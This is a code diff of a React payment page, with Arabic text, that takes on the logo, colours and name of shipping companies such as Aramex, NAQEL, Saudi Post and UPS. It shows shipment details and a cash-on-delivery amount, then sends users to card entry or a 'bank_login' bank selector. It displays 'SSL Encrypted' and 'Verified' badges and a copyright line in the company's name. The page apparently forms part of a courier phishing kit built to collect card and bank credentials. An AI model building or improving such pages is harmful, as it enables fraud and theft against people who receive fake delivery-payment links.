@@ -1,13 +1,16 @@
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
+import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { getCompanyLayout } from "@/components/CompanyLayouts";
-import { NAQELLayout, ZajilLayout, SaudiPostLayout, UPSLayout } from "@/components/MoreCompanyLayouts";
-import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
+import { shippingCompanyBranding } from "@/lib/brandingSystem";
 import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
-import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";
+import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, ShieldCheck, Lock, Sparkles, CheckCircle2 } from "lucide-react";
+import { designSystem } from "@/lib/designSystem";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
+import BrandedCarousel from "@/components/BrandedCarousel";
+import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
 
 const PaymentDetails = () => {
   const { id } = useParams();
@@ -17,38 +20,13 @@ const PaymentDetails = () => {
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   const shippingInfo = linkData?.payload as any;
-
-  const getLayout = () => {
-    const key = serviceKey.toLowerCase();
-    switch (key) {
-      case 'naqel':
-        return NAQELLayout;
-      case 'zajil':
-        return ZajilLayout;
-      case 'saudipost':
-        return SaudiPostLayout;
-      case 'ups':
-        return UPSLayout;
-      default:
-        const CompanyLayout = getCompanyLayout(serviceKey);
-        return CompanyLayout;
-    }
-  };
-
-  const LayoutComponent = getLayout();
-
-  // Get country code from link data
   const countryCode = shippingInfo?.selectedCountry || "SA";
-
-  // Get currency info for display
   const currencyInfo = getCurrencyByCountry(countryCode);
 
-  // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
-
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
+  let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
       amount = rawAmount;
@@ -60,123 +38,325 @@ const PaymentDetails = () => {
     }
   }
 
-  // Format amount with currency symbol and name
   const formattedAmount = formatCurrency(amount, countryCode);
   
+  const detectedEntity = detectEntityFromURL();
+  const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
+  const displayLogo = entityLogo || branding.logo;
+  
+  const primaryColor = companyBranding?.colors.primary || branding.colors.primary;
+  const secondaryColor = companyBranding?.colors.secondary || branding.colors.secondary;
+  
   const handleProceed = () => {
-    // Check payment method from link data
     const paymentMethod = shippingInfo?.payment_method || 'card';
     
-    // If payment method is "card", skip bank selector and go directly to card input
     if (paymentMethod === 'card') {
       navigate(`/pay/${id}/card-input`);
     } else {
-      // For "bank_login" method, show bank selector
       navigate(`/pay/${id}/bank-selector`);
     }
   };
   
-  const paymentContent = (
+  return (
     <>
-      {/* Shipping Info Display */}
-      {shippingInfo && (
-        <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
-          <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">تفاصيل الشحنة</h3>
-          <div className="space-y-2 text-xs sm:text-sm">
-            {shippingInfo.tracking_number && (
-              <div className="flex items-center gap-2">
-                <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                <span className="text-muted-foreground">رقم الشحنة:</span>
-                <span className="font-semibold">{shippingInfo.tracking_number}</span>
+      <PaymentMetaTags 
+        serviceKey={serviceKey}
+        serviceName={serviceName}
+        title={`تفاصيل الدفع - ${serviceName}`}
+        customDescription={`أكمل عملية الدفع بأمان وسهولة - ${serviceName}`}
+        amount={formattedAmount}
+      />
+
+      {/* Branded Header */}
+      <div 
+        className="sticky top-0 z-50 w-full shadow-lg"
+        style={{
+          background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
+          borderBottom: `3px solid ${primaryColor}`
+        }}
+      >
+        <div className="container mx-auto px-4">
+          <div className="flex items-center justify-between h-16 sm:h-18">
+            <div className="flex items-center gap-4">
+              {displayLogo && (
+                <img 
+                  src={displayLogo} 
+                  alt={serviceName}
+                  className="h-10 sm:h-12 w-auto object-contain brightness-0 invert"
+                />
+              )}
+              <div className="text-white">
+                <h2 className="text-lg sm:text-xl font-bold">
+                  {serviceName}
+                </h2>
+                <p className="text-xs opacity-90">
+                  الدفع الآمن - Secure Payment
+                </p>
               </div>
-            )}
-            {shippingInfo.package_description && (
-              <div className="flex items-center gap-2">
-                <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                <span className="text-muted-foreground">وصف الطرد:</span>
-                <span className="font-semibold">{shippingInfo.package_description}</span>
-              </div>
-            )}
-            {shippingInfo.cod_amount > 0 && (
-              <div className="flex items-center gap-2">
-                <DollarSign className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                <span className="text-muted-foreground">مبلغ COD:</span>
-                <span className="font-semibold">{formatCurrency(shippingInfo.cod_amount, countryCode)}</span>
-              </div>
-            )}
-          </div>
-        </div>
-      )}
-      
-      {/* Payment Summary */}
-      <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
-        <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
-          <span className="text-muted-foreground">الخدمة</span>
-          <span className="font-semibold">{serviceName}</span>
-        </div>
-        
-        <div 
-          className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
-          style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
-          }}
-        >
-          <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
-          <span className="text-xl sm:text-2xl font-bold" style={{ color: branding.colors.primary }}>
-            {formattedAmount}
-          </span>
-        </div>
-      </div>
-    
-      {/* Payment Method */}
-      <div className="mb-6 sm:mb-8">
-        <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">طريقة الدفع</h3>
-        <div 
-          className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4"
-          style={{
-            borderColor: branding.colors.primary,
-            background: `${branding.colors.primary}10`
-          }}
-        >
-          <div className="flex items-center gap-2 sm:gap-3">
-            <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
-            <div>
-              <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
-              <p className="text-xs sm:text-sm text-muted-foreground">
-                Visa، Mastercard، Mada
-              </p>
+            </div>
+            
+            <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/20 backdrop-blur-sm">
+              <ShieldCheck className="w-4 h-4 text-white" />
+              <span className="text-xs font-medium text-white">آمن</span>
             </div>
           </div>
         </div>
       </div>
-      
-      {/* Proceed Button */}
-      <Button
-        onClick={handleProceed}
-        size="lg"
-        className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+
+      {/* Hero Carousel */}
+      <BrandedCarousel serviceKey={serviceKey} className="mb-0" />
+
+      {/* Main Content */}
+      <div 
+        className="min-h-screen py-8 sm:py-12"
+        dir="rtl"
         style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+          background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
+          fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
         }}
       >
-        <span className="ml-2">الدفع بالبطاقة</span>
-        <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
-      </Button>
-    
-      <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-        بالمتابعة، أنت توافق على الشروط والأحكام
-      </p>
-    </>
-  );
+        <div className="container mx-auto px-4 max-w-2xl">
+          {/* Page Title */}
+          <div className="text-center mb-8">
+            <div className="flex items-center justify-center gap-3 mb-4">
+              <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
+              <h1 
+                className="text-3xl sm:text-4xl font-bold"
+                style={{
+                  color: designSystem.colors.neutral[900],
+                  fontFamily: designSystem.typography.fontFamilies.arabic
+                }}
+              >
+                تفاصيل الدفع
+              </h1>
+            </div>
+            <p className="text-base text-gray-600">
+              راجع تفاصيل طلبك قبل المتابعة للدفع
+            </p>
+          </div>
 
-  return (
-    <LayoutComponent
-      companyKey={serviceKey}
-      trackingNumber={shippingInfo?.tracking_number}
-      amount={formattedAmount}
-    >
-      {paymentContent}
-    </LayoutComponent>
+          <Card 
+            className="overflow-hidden border-0 mb-6"
+            style={{
+              borderRadius: '20px',
+              boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
+            }}
+          >
+            {/* Shipping Info Display */}
+            {shippingInfo && (
+              <>
+                <div 
+                  className="px-6 sm:px-8 py-6"
+                  style={{
+                    background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
+                    borderBottom: `2px solid ${primaryColor}30`
+                  }}
+                >
+                  <div className="flex items-center gap-3">
+                    <div 
+                      className="w-12 h-12 rounded-xl flex items-center justify-center"
+                      style={{
+                        background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
+                      }}
+                    >
+                      <Package className="w-6 h-6 text-white" />
+                    </div>
+                    <div>
+                      <h2 className="text-xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
+                        تفاصيل الشحنة
+                      </h2>
+                      <p className="text-sm text-gray-600">
+                        معلومات الطرد والتوصيل
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                <div className="px-6 sm:px-8 py-6 bg-white space-y-4">
+                  {shippingInfo.tracking_number && (
+                    <div className="flex items-center justify-between py-3 border-b">
+                      <div className="flex items-center gap-2 text-gray-600">
+                        <Hash className="w-4 h-4" />
+                        <span className="text-sm">رقم الشحنة</span>
+                      </div>
+                      <span className="font-bold text-base">{shippingInfo.tracking_number}</span>
+                    </div>
+                  )}
+                  {shippingInfo.package_description && (
+                    <div className="flex items-center justify-between py-3 border-b">
+                      <div className="flex items-center gap-2 text-gray-600">
+                        <Truck className="w-4 h-4" />
+                        <span className="text-sm">وصف الطرد</span>
+                      </div>
+                      <span className="font-semibold text-base">{shippingInfo.package_description}</span>
+                    </div>
+                  )}
+                </div>
+              </>
+            )}
+          </Card>
+
+          {/* Payment Summary */}
+          <Card 
+            className="overflow-hidden border-0 mb-6"
+            style={{
+              borderRadius: '20px',
+              boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
+            }}
+          >
+            <div 
+              className="px-6 sm:px-8 py-6"
+              style={{
+                background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
+                borderBottom: `2px solid ${primaryColor}30`
+              }}
+            >
+              <div className="flex items-center gap-3">
+                <div 
+                  className="w-12 h-12 rounded-xl flex items-center justify-center"
+                  style={{
+                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
+                  }}
+                >
+                  <DollarSign className="w-6 h-6 text-white" />
+                </div>
+                <div>
+                  <h2 className="text-xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
+                    ملخص الدفع
+                  </h2>
+                  <p className="text-sm text-gray-600">
+                    المبلغ المطلوب
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <div className="px-6 sm:px-8 py-6 bg-white space-y-4">
+              <div className="flex justify-between py-3 border-b">
+                <span className="text-gray-600">الخدمة</span>
+                <span className="font-bold text-base">{serviceName}</span>
+              </div>
+              
+              <div 
+                className="flex justify-between items-center py-5 px-5 rounded-xl"
+                style={{
+                  background: `linear-gradient(135deg, ${primaryColor}10, ${secondaryColor}10)`
+                }}
+              >
+                <span className="text-lg font-bold">المبلغ الإجمالي</span>
+                <span className="text-3xl font-bold" style={{ color: primaryColor }}>
+                  {formattedAmount}
+                </span>
+              </div>
+            </div>
+          </Card>
+
+          {/* Payment Method */}
+          <Card 
+            className="overflow-hidden border-0 mb-8"
+            style={{
+              borderRadius: '20px',
+              boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
+            }}
+          >
+            <div 
+              className="px-6 sm:px-8 py-6"
+              style={{
+                background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
+                borderBottom: `2px solid ${primaryColor}30`
+              }}
+            >
+              <div className="flex items-center gap-3">
+                <div 
+                  className="w-12 h-12 rounded-xl flex items-center justify-center"
+                  style={{
+                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
+                  }}
+                >
+                  <CreditCard className="w-6 h-6 text-white" />
+                </div>
+                <div>
+                  <h2 className="text-xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
+                    طريقة الدفع
+                  </h2>
+                  <p className="text-sm text-gray-600">
+                    الدفع الإلكتروني الآمن
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <div className="px-6 sm:px-8 py-6 bg-white">
+              <div 
+                className="flex items-center gap-4 p-5 rounded-xl border-2"
+                style={{
+                  borderColor: primaryColor,
+                  background: `${primaryColor}08`
+                }}
+              >
+                <div 
+                  className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
+                  style={{
+                    background: `${primaryColor}20`
+                  }}
+                >
+                  <CreditCard className="w-6 h-6" style={{ color: primaryColor }} />
+                </div>
+                <div className="flex-1">
+                  <p className="font-bold text-base mb-1">الدفع بالبطاقة</p>
+                  <p className="text-sm text-gray-600">
+                    Visa • Mastercard • Mada
+                  </p>
+                </div>
+                <CheckCircle2 className="w-6 h-6" style={{ color: primaryColor }} />
+              </div>
+            </div>
+          </Card>
+      
+          {/* Proceed Button */}
+          <Button
+            onClick={handleProceed}
+            size="lg"
+            className="w-full text-xl py-8 text-white font-bold transition-all duration-300 hover:shadow-2xl rounded-xl"
+            style={{
+              background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
+              boxShadow: `0 12px 32px -8px ${primaryColor}70`
+            }}
+          >
+            <span className="ml-3">متابعة للدفع</span>
+            <ArrowLeft className="w-6 h-6 mr-2" />
+          </Button>
+    
+          <div className="mt-6 flex items-center justify-center gap-2 text-sm text-gray-600">
+            <Lock className="w-4 h-4" />
+            <p>
+              بالمتابعة، أنت توافق على{' '}
+              <a href="#" className="underline hover:no-underline" style={{ color: primaryColor }}>
+                الشروط والأحكام
+              </a>
+            </p>
+          </div>
+
+          {/* Footer */}
+          <div className="mt-8 text-center">
+            <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mb-3">
+              <div className="flex items-center gap-1.5">
+                <Lock className="w-3.5 h-3.5" />
+                <span>SSL Encrypted</span>
+              </div>
+              <span>•</span>
+              <div className="flex items-center gap-1.5">
+                <ShieldCheck className="w-3.5 h-3.5" />
+                <span>Verified</span>
+              </div>
+            </div>
+            <p className="text-xs text-gray-400">
+              © 2025 {serviceName}. جميع الحقوق محفوظة.
+            </p>
+          </div>
+        </div>
+      </div>
+    </>
   );
 };
 
